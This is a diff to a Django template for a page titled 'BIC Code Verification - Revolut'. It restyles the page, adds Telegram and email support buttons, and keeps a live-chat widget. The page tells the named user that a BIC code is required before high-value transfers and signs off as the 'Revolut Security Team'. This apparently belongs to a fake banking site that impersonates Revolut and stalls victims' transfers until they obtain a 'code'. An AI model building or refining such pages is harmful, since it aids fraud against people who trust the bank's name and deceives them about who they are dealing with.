@@ -4,40 +4,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <!-- Begin of Chaport Live Chat code -->
-<script type="text/javascript">
-(function(w,d,v3){
-w.chaportConfig = {
-  appId : '6a43a2901fd734cd86c8645d',
-};
-
-if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
-</script>
-<!-- End of Chaport Live Chat code -->
-<link rel="icon" type="image/png" sizes="32x32" href="{% static 'images/blue-32x32.png' %}">
-<link rel="icon" type="image/png" sizes="16x16" href="{% static 'images/blue-16x16.png' %}">
-<link rel="shortcut icon" href="{% static 'images/favicon.ico' %}" type="image/x-icon">
-<link rel="apple-touch-icon" href="{% static 'images/blue-180x180.png' %}">
-<link rel="manifest" href="{% static 'manifest.json' %}">
-<meta name="theme-color" content="#0a3ee3">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
     <title>BIC Code Verification - Revolut</title>
+    <!-- Chaport Live Chat -->
+    <script type="text/javascript">
+        (function(w,d,v3){
+            w.chaportConfig = { appId: '6a43a2901fd734cd86c8645d' };
+            if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
+    </script>
+    <!-- Favicons -->
+    <link rel="icon" type="image/png" sizes="32x32" href="{% static 'images/blue-32x32.png' %}">
+    <link rel="icon" type="image/png" sizes="16x16" href="{% static 'images/blue-16x16.png' %}">
+    <link rel="shortcut icon" href="{% static 'images/favicon.ico' %}" type="image/x-icon">
+    <link rel="apple-touch-icon" href="{% static 'images/blue-180x180.png' %}">
+    <link rel="manifest" href="{% static 'manifest.json' %}">
+    <meta name="theme-color" content="#0a3ee3">
+    <!-- Fonts & Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
     <style>
+        /* ============================================================
+               REVOLUT MODERN DARK UI — BIC CODE VERIFICATION
+               Consistent with all other Revolut pages
+               ============================================================ */
         :root {
-            --light-blue: #000000;
-            --primary-blue: #ffffff;
-            --dark-blue: #ffffff;
-            --accent-blue: #a3a3a3;
-            --soft-gray: #000000;
-            --medium-gray: rgba(255, 255, 255, 0.1);
-            --text-dark: #ffffff;
-            --text-light: #9ca3af;
-            --success: #27AE60;
-            --warning: #E67E22;
-            --error: #E74C3C;
+            --bg-primary: #0b0b0f;
+            --bg-secondary: #14141a;
+            --bg-card: #1a1a24;
+            --bg-input: #1e1e2a;
+            --bg-input-focus: #28283a;
+            --text-primary: #f1f3f7;
+            --text-secondary: #a8b0c8;
+            --text-muted: #6a7290;
+            --border-subtle: rgba(255, 255, 255, 0.06);
+            --border-focus: rgba(255, 255, 255, 0.18);
+            --accent-blue: #2b7aff;
+            --accent-glow: rgba(43, 122, 255, 0.25);
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --error: #e74c3c;
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --shadow-card: 0 12px 40px rgba(0, 0, 0, 0.55);
+            --shadow-input: 0 0 0 3px rgba(43, 122, 255, 0.12);
+            --transition-fast: 0.15s ease;
+            --transition-med: 0.25s ease;
         }
 
         * {
@@ -47,24 +60,29 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
         }
 
         body {
-            font-family: 'Source Sans Pro', sans-serif;
-            background: linear-gradient(135deg, var(--light-blue) 0%, var(--soft-gray) 100%);
-            color: var(--text-dark);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
             min-height: 100vh;
             line-height: 1.6;
             padding: 20px;
+            -webkit-font-smoothing: antialiased;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* Main Container */
+        /* ====== MAIN CONTAINER ====== */
         .main-container {
             max-width: 600px;
+            width: 100%;
             margin: 40px auto;
-            background: rgba(255, 255, 255, 0.95);
+            background: var(--bg-card);
             backdrop-filter: blur(10px);
-            border-radius: 16px;
-            box-shadow: 0 15px 35px rgba(42, 110, 187, 0.15);
-            padding: 40px;
-            border: 1px solid var(--medium-gray);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-card);
+            padding: 44px 40px 40px;
+            border: 1px solid var(--border-subtle);
             position: relative;
             overflow: hidden;
             animation: fadeInUp 0.8s ease-out;
@@ -76,8 +94,14 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             top: 0;
             left: 0;
             width: 100%;
-            height: 5px;
-            background: linear-gradient(90deg, var(--primary-blue) 0%, var(--accent-blue) 100%);
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent-blue), #6c5ce7);
+            animation: colorFlow 3s ease-in-out infinite;
+        }
+
+        @keyframes colorFlow {
+            0%, 100% { background: linear-gradient(90deg, var(--accent-blue), #6c5ce7); }
+            50% { background: linear-gradient(90deg, #6c5ce7, var(--accent-blue)); }
         }
 
         @keyframes fadeInUp {
@@ -91,65 +115,67 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             }
         }
 
-        /* Header Section */
+        /* ====== HEADER SECTION ====== */
         .header-section {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 28px;
         }
 
         .security-icon {
             font-size: 3rem;
-            color: var(--primary-blue);
-            margin-bottom: 15px;
+            color: var(--accent-blue);
+            margin-bottom: 12px;
+            display: inline-block;
             animation: pulse 2s infinite;
         }
 
         .header-section h1 {
-            font-family: 'Montserrat', sans-serif;
-            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
             font-size: 2rem;
-            color: var(--dark-blue);
-            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            position: relative;
+            padding-bottom: 15px;
         }
 
         .header-section h1::after {
             content: "";
-            display: block;
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
             width: 60px;
             height: 3px;
-            background: var(--primary-blue);
-            margin: 10px auto 0;
+            background: var(--accent-blue);
             border-radius: 2px;
-            animation: expandWidth 1s ease-out;
         }
 
-        /* User Greeting */
+        /* ====== USER GREETING ====== */
         .user-greeting {
             text-align: center;
-            margin-bottom: 25px;
-            font-size: 1.1rem;
-            animation: fadeIn 1s ease-out 0.3s both;
+            margin-bottom: 22px;
+            font-size: 1.05rem;
+            color: var(--text-secondary);
+            animation: fadeIn 0.8s ease-out 0.3s both;
         }
 
-        .user-greeting p {
-            margin-bottom: 5px;
-        }
-
-        .user-name {
+        .user-greeting .user-name {
             font-weight: 600;
-            color: var(--dark-blue);
+            color: var(--text-primary);
         }
 
-        /* Security Notice */
+        /* ====== SECURITY NOTICE ====== */
         .security-notice {
-            background: rgba(230, 126, 34, 0.1);
-            color: var(--text-dark);
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 8px;
+            background: rgba(243, 156, 18, 0.06);
             border-left: 4px solid var(--warning);
+            padding: 16px 20px;
+            border-radius: var(--radius-sm);
+            margin-bottom: 28px;
             font-size: 0.95rem;
-            line-height: 1.5;
+            color: var(--text-secondary);
+            line-height: 1.6;
             animation: slideInLeft 0.8s ease-out 0.5s both;
         }
 
@@ -157,186 +183,247 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             color: var(--warning);
         }
 
-        /* Form Styling */
+        /* ====== FORM ====== */
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 24px;
             animation: fadeIn 0.8s ease-out 0.7s both;
         }
 
         .form-label {
             font-weight: 600;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             display: block;
-            color: var(--dark-blue);
-            font-size: 1rem;
-            font-family: 'Montserrat', sans-serif;
+            color: var(--text-secondary);
+            font-size: 0.82rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-family: 'Inter', sans-serif;
         }
 
-        .form-control, input {
+        .input-group {
+            display: flex;
+            align-items: center;
+            background: var(--bg-input);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            transition: var(--transition-fast);
+        }
+
+        .input-group:focus-within {
+            border-color: var(--accent-blue);
+            box-shadow: var(--shadow-input);
+            background: var(--bg-input-focus);
+        }
+
+        .form-control {
             width: 100%;
             padding: 14px 16px;
-            border: 1px solid var(--medium-gray);
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: rgba(255, 255, 255, 0.03);
-            font-family: 'Source Sans Pro', sans-serif;
-        }
-
-        .form-control:focus, input {
+            background: transparent;
+            border: none;
+            font-size: 1rem;
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
             outline: none;
-            border-color: var(--primary-blue);
-            box-shadow: 0 0 0 3px rgba(42, 110, 187, 0.15);
-            background: rgba(255, 255, 255, 0.03);
-            transform: translateY(-2px);
         }
 
-        /* Error Styling */
+        .form-control::placeholder {
+            color: var(--text-muted);
+            opacity: 0.7;
+        }
+
+        .input-group-text {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            padding-right: 16px;
+            font-size: 1.1rem;
+        }
+
+        /* ====== ALERT (errors) ====== */
         .alert-danger {
-            background: rgba(231, 76, 60, 0.1);
-            color: var(--error);
-            border-radius: 8px;
+            background: rgba(231, 76, 60, 0.08);
+            color: #f5b0a0;
             border: none;
             border-left: 4px solid var(--error);
-            padding: 12px;
+            border-radius: var(--radius-sm);
+            padding: 12px 18px;
             margin-bottom: 20px;
+            font-weight: 500;
             animation: shake 0.5s ease-out;
         }
 
-        /* Info Card */
+        .alert-danger p {
+            margin: 0;
+        }
+
+        /* ====== INFO CARD ====== */
         .info-card {
-            background: rgba(42, 110, 187, 0.08);
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 25px;
+            background: rgba(43, 122, 255, 0.05);
+            border-left: 4px solid var(--accent-blue);
+            border-radius: var(--radius-sm);
+            padding: 18px 20px;
+            margin-bottom: 28px;
             text-align: center;
-            border-left: 4px solid var(--primary-blue);
             animation: fadeIn 0.8s ease-out 0.9s both;
         }
 
         .info-card small {
-            color: var(--text-dark);
+            color: var(--text-secondary);
             font-size: 0.9rem;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
-        /* Submit Button */
+        .info-card strong {
+            color: var(--text-primary);
+        }
+
+        /* ====== SUBMIT BUTTON ====== */
         .submit-btn {
             width: 100%;
-            padding: 16px;
+            padding: 16px 20px;
             border: none;
-            border-radius: 8px;
-            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--accent-blue) 100%);
-            color: white;
+            border-radius: var(--radius-sm);
+            background: linear-gradient(135deg, var(--accent-blue), #5a7cff);
+            color: #fff;
             font-weight: 600;
-            font-size: 1.1rem;
+            font-size: 1.05rem;
+            font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(42, 110, 187, 0.25);
-            font-family: 'Montserrat', sans-serif;
+            transition: var(--transition-med);
+            box-shadow: 0 4px 20px rgba(43, 122, 255, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
             animation: fadeIn 0.8s ease-out 1.1s both;
         }
 
         .submit-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(42, 110, 187, 0.35);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(43, 122, 255, 0.35);
+            background: linear-gradient(135deg, #3b8aff, #6a8aff);
+            color: #fff;
         }
 
         .submit-btn:active {
-            transform: translateY(0);
+            transform: scale(0.98);
         }
 
-        /* Contact Section */
+        .submit-btn i {
+            font-size: 1rem;
+        }
+
+        /* ====== CONTACT SECTION ====== */
         .contact-section {
             text-align: center;
-            margin-top: 25px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.7);
-            border-radius: 8px;
+            margin-top: 28px;
+            padding: 16px 18px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-subtle);
             animation: fadeIn 0.8s ease-out 1.3s both;
         }
 
         .contact-section p {
-            margin-bottom: 5px;
-            color: var(--text-dark);
+            margin-bottom: 6px;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
         }
 
         .email-link {
-            color: var(--primary-blue);
+            color: var(--accent-blue);
             font-weight: 600;
             text-decoration: none;
-            transition: all 0.3s ease;
+            transition: var(--transition-fast);
             display: inline-block;
         }
 
         .email-link:hover {
-            color: var(--dark-blue);
-            transform: translateY(-2px);
+            color: #5a7cff;
+            transform: translateY(-1px);
+            text-decoration: none;
         }
 
+        /* ====== ANIMATIONS ====== */
         @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.05);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @keyframes expandWidth {
-            from {
-                width: 0;
-            }
-            to {
-                width: 60px;
-            }
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
 
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         @keyframes slideInLeft {
-            from {
-                opacity: 0;
-                transform: translateX(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         @keyframes shake {
-            0%, 100% {
-                transform: translateX(0);
-            }
-            10%, 30%, 50%, 70%, 90% {
-                transform: translateX(-5px);
-            }
-            20%, 40%, 60%, 80% {
-                transform: translateX(5px);
-            }
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
 
-        @keyframes bounce {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
+        /* ====== FLOATING SUPPORT BUTTONS ====== */
+        .float-btn {
+            position: fixed;
+            left: 24px;
+            z-index: 1000;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.5);
+            transition: var(--transition-med);
+        }
+        .float-btn:hover {
+            transform: scale(1.08) translateY(-2px);
+        }
+        .float-btn .tooltip {
+            position: absolute;
+            left: 68px;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: var(--transition-med);
+        }
+        .float-btn:hover .tooltip {
+            opacity: 1;
         }
 
-        /* Responsive Design */
+        .telegram-float {
+            bottom: 100px;
+            background: #0088cc;
+        }
+        .telegram-float .telegram-icon {
+            width: 28px;
+            height: 28px;
+            filter: brightness(0) invert(1);
+        }
+
+        .email-float {
+            bottom: 168px;
+            background: linear-gradient(135deg, #2b7aff, #5a7cff);
+        }
+        .email-float .email-icon {
+            color: #fff;
+            font-size: 1.4rem;
+        }
+
+        /* ====== RESPONSIVE ====== */
         @media (max-width: 768px) {
             .main-container {
                 padding: 30px 20px;
@@ -350,277 +437,44 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             .security-icon {
                 font-size: 2.5rem;
             }
-        }
 
-        .telegram-float {
-            position: fixed;
-            left: 20px;
-            bottom: 20px;
-            z-index: 1000;
-            animation: float 3s ease-in-out infinite;
-        }
-
-        .telegram-link {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 60px;
-            height: 60px;
-            background: #0088cc;
-            border-radius: 50%;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            text-decoration: none;
-        }
-
-        .telegram-link:hover {
-            background: #0077b5;
-            transform: scale(1.1);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
-        }
-
-        .telegram-icon {
-            width: 30px;
-            height: 30px;
-            filter: brightness(0) invert(1);
-        }
-
-        .telegram-tooltip {
-            position: absolute;
-            left: 70px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            white-space: nowrap;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-        }
-
-        .telegram-link:hover .telegram-tooltip {
-            opacity: 1;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(0);
+            .float-btn {
+                width: 48px;
+                height: 48px;
+                left: 14px;
             }
-            50% {
-                transform: translateY(-10px);
-            }
-            100% {
-                transform: translateY(0);
-            }
-        }
-
-        @media (max-width: 768px) {
             .telegram-float {
-                left: 10px;
-                bottom: 10px;
+                bottom: 80px;
             }
-
-            .telegram-link {
-                width: 50px;
-                height: 50px;
+            .email-float {
+                bottom: 140px;
             }
-
-            .telegram-icon {
-                width: 25px;
-                height: 25px;
+            .float-btn .tooltip {
+                display: none;
             }
         }
-          .email-float {
-        position: fixed;
-        left: 20px;
-        bottom: 90px;
-        z-index: 1000;
-        animation: floatEmail 3s ease-in-out infinite;
-    }
 
-    .email-link {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        width: 60px;
-        height: 60px;
-        background: linear-gradient(135deg, #2A6EBB 0%, #4A90E2 100%);
-        border-radius: 50%;
-        box-shadow: 0 4px 10px rgba(42, 110, 187, 0.3);
-        transition: all 0.3s ease;
-        text-decoration: none;
-    }
-
-    .email-link:hover {
-        background: linear-gradient(135deg, #1A4A7A 0%, #2A6EBB 100%);
-        transform: scale(1.1);
-        box-shadow: 0 6px 15px rgba(42, 110, 187, 0.4);
-    }
-
-    .email-icon {
-        color: white;
-        font-size: 1.5rem;
-    }
-
-    .email-tooltip {
-        position: absolute;
-        left: 70px;
-        background: rgba(0, 0, 0, 0.8);
-        color: white;
-        padding: 8px 12px;
-        border-radius: 4px;
-        font-size: 14px;
-        white-space: nowrap;
-        opacity: 0;
-        transition: opacity 0.3s ease;
-        pointer-events: none;
-    }
-
-    .email-link:hover .email-tooltip {
-        opacity: 1;
-    }
-
-    @keyframes floatEmail {
-        0% {
-            transform: translateY(0);
+        @media (max-width: 480px) {
+            .header-section h1 {
+                font-size: 1.4rem;
+            }
+            .submit-btn {
+                font-size: 0.95rem;
+                padding: 14px 16px;
+            }
+            .form-control {
+                font-size: 0.95rem;
+                padding: 12px 14px;
+            }
         }
-        50% {
-            transform: translateY(-8px);
-        }
-        100% {
-            transform: translateY(0);
-        }
-    }
-
-    @media (max-width: 768px) {
-        .email-float {
-            left: 10px;
-            bottom: 80px;
-        }
-
-        .email-link {
-            width: 50px;
-            height: 50px;
-        }
-
-        .email-icon {
-            font-size: 1.3rem;
-        }
-    }
-    
-        /* Sitewide Dark Mode Overrides to match Revolut Landing Page */
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-        
-        body {
-            background: #000000 !important;
-            color: #ffffff !important;
-            font-family: 'Poppins', sans-serif !important;
-        }
-        .login-container, .account-card, .balance-card, .card, .modal-content, .transaction-card, .loan-card, .investment-card {
-            background: rgba(10, 10, 10, 0.85) !important;
-            border: 1px solid rgba(255, 255, 255, 0.08) !important;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6) !important;
-            color: #ffffff !important;
-        }
-        .bank-header {
-            background: rgba(0, 0, 0, 0.85) !important;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .bank-header h1, .bank-header h1 i {
-            color: #ffffff !important;
-        }
-        .nav-toggle {
-            background: rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .nav-sidebar {
-            background: linear-gradient(180deg, #050505 0%, #111111 100%) !important;
-            border-left: 1px solid rgba(255, 255, 255, 0.08) !important;
-        }
-        .sidebar-header {
-            background: rgba(255, 255, 255, 0.03) !important;
-        }
-        .account-number-section, .payment-icon, .info-box, .detail-row {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border: 1px solid rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .account-number {
-            color: #ffffff !important;
-        }
-        .payment-label {
-            color: #9ca3af !important;
-        }
-        .form-control {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border: 1px solid rgba(255, 255, 255, 0.1) !important;
-            color: #ffffff !important;
-        }
-        .form-control:focus {
-            background: rgba(255, 255, 255, 0.05) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
-            color: #ffffff !important;
-            box-shadow: none !important;
-        }
-        .login-btn, .login-button, .btn-primary, .submit-btn, .btn-primary-3d, .btn-hero-primary {
-            background: #ffffff !important;
-            color: #000000 !important;
-            border: 1px solid #ffffff !important;
-        }
-        .login-btn:hover, .login-button:hover, .btn-primary:hover, .submit-btn:hover, .btn-primary-3d:hover, .btn-hero-primary:hover {
-            background: #e5e7eb !important;
-            color: #000000 !important;
-        }
-        .btn-outline-primary, .btn-secondary, .btn-outline-3d {
-            background: transparent !important;
-            color: #ffffff !important;
-            border: 1px solid rgba(255, 255, 255, 0.2) !important;
-        }
-        .btn-outline-primary:hover, .btn-secondary:hover, .btn-outline-3d:hover {
-            background: rgba(255, 255, 255, 0.08) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
-        }
-        a {
-            color: #ffffff;
-        }
-        a:hover {
-            color: #d1d5db;
-        }
-        .login-image {
-            background: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)),
-                        url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80') !important;
-        }
-        .security-notice {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border-left: 4px solid #ffffff !important;
-            color: #9ca3af !important;
-        }
-        .security-notice i {
-            color: #ffffff !important;
-        }
-        .logo-icon {
-            background: #ffffff !important;
-        }
-        .logo-icon i {
-            color: #000000 !important;
-        }
-        .logo-text {
-            color: #ffffff !important;
-        }
-        .login-form-container {
-            background: #09090b !important;
-            color: #ffffff !important;
-        }
-
-</style>
+    </style>
 </head>
 <body>
 
-
+    <!-- ====== MAIN CONTAINER ====== -->
     <div class="main-container">
-        <!-- Header Section -->
+
+        <!-- Header -->
         <div class="header-section">
             <i class="fas fa-shield-alt security-icon"></i>
             <h1>BIC Code Required</h1>
@@ -628,7 +482,7 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
 
         <!-- User Greeting -->
         <div class="user-greeting">
-            <p>Dear <span class="user-name">{{userprofile.first_name}} {{userprofile.middle_name}}</span>,</p>
+            <p>Dear <span class="user-name">{{ userprofile.first_name }} {{ userprofile.middle_name }}</span>,</p>
         </div>
 
         <!-- Security Notice -->
@@ -636,22 +490,23 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             <p><strong>Security Notice:</strong> To ensure secure and compliant transactions, we require a BIC code for high-value or international transfers. This code helps verify the legitimacy of transfers and enhances protection against fraud. Thank you for your cooperation in keeping your transactions secure.</p>
         </div>
 
-        <!-- BIC Code Form -->
+        <!-- Form -->
         <form method="post">
             {% csrf_token %}
 
             <div class="form-group">
-                <label for="id_bic" class="form-label">Enter BIC Code:</label>
+                <label for="id_bic" class="form-label">Enter BIC Code</label>
                 <div class="input-group">
                     {{ form.bic }}
-                    <span class="input-group-text bg-transparent border-left-0">
-                        <i class="fas fa-key text-muted"></i>
+                    <span class="input-group-text">
+                        <i class="fas fa-key"></i>
                     </span>
                 </div>
             </div>
 
+            <!-- Errors -->
             {% if form.errors %}
-                <div class="alert alert-danger">
+                <div class="alert-danger">
                     {% for error in form.non_field_errors %}
                         <p>{{ error }}</p>
                     {% endfor %}
@@ -663,8 +518,9 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
                 <small>Thank you for your cooperation.<br>Best regards,<br><strong>Revolut Security Team</strong></small>
             </div>
 
+            <!-- Submit -->
             <button type="submit" class="submit-btn">
-                <i class="fas fa-check-circle" style="margin-right: 8px;"></i>
+                <i class="fas fa-check-circle"></i>
                 Verify BIC Code
             </button>
         </form>
@@ -677,23 +533,32 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             </a>
         </div>
     </div>
-<script>
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register("{% static 'sw.js' %}")
-        .then(registration => {
-            console.log('✅ Service Worker Registered:', registration);
 
-            // Check for updates
-            registration.addEventListener('updatefound', () => {
-                const newWorker = registration.installing;
-                console.log('🔄 New service worker found:', newWorker);
-            });
-        })
-        .catch(error => {
-            console.log('❌ Service Worker registration failed:', error);
-        });
-    }
-</script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <!-- ====== FLOATING SUPPORT BUTTONS ====== -->
+    <!-- Telegram -->
+    <a href="https://t.me/" class="float-btn telegram-float" target="_blank" rel="noopener" aria-label="Telegram support">
+        <svg class="telegram-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.5 2.5L1.5 10.5L8.5 14.5L17.5 7.5L10.5 15.5L13.5 22.5L22.5 2.5Z" stroke="white" stroke-width="1.8" stroke-linejoin="round"/>
+            <path d="M10.5 15.5L8.5 20.5L5.5 14.5" stroke="white" stroke-width="1.8" stroke-linejoin="round"/>
+        </svg>
+        <span class="tooltip">Telegram Support</span>
+    </a>
+
+    <!-- Email -->
+    <a href="mailto:" class="float-btn email-float" aria-label="Email support">
+        <i class="fas fa-envelope email-icon"></i>
+        <span class="tooltip">Email Support</span>
+    </a>
+
+    <!-- ====== SCRIPTS ====== -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register("{% static 'sw.js' %}")
+                .then(reg => console.log('✅ SW registered:', reg))
+                .catch(err => console.log('❌ SW registration failed:', err));
+        }
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
